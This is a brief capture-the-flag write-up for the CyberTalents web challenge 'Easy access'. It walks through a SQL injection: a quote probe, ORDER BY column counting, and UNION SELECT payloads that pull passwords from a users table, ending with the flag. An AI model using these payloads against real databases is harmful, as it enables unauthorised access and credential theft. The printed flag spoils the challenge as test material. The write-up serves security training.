# Challenge Name:
 [*Easy access*](https://cybertalents.com/challenges/web/easy-access)
 
# Challenge Description
Only superpower makes you see unlimited view.

Link: [http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/easy-access/](http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/easy-access/)

## Answer
* First we try inject (') to know database version and see if the character was filterd or not.
* Now try use order clause to know how many columns (Try until you reach number of columns don't make syntax error)
```sql
10' ORDER BY 10-- -
```
* Now we are ready to use Union in query
```sql
1' UNION ALL SELECT Password,1,1,2,1 FROM users-- -
```
* He will notice you that you should login as admin to see the flag so
```sql
admin' UNION ALL SELECT Password,1,1,1,1 FROM users-- -
```
* You got the Flag!!

 ## The Flag
 > flag{!njection_3v3ry_wh3r3} 
